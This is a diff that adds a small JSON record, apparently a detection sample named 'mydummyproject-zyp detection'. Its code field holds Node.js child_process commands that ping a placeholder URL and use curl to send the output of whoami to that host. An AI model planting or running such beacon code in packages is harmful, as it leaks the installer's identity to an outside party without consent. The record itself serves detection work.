@@ -1,0 +1,4 @@
+{
+  "name": "mydummyproject-zyp detection",
+  "code": "\n      require('child_process').exec('ping -c 4 <URL>');\n      require('child_process').exec(`curl -X POST -d \"$(whoami)\" <URL>/c`);\n      require('child_process').exec(`curl \"<URL>/c?user=$(whoami)\"`);\n    "
+}
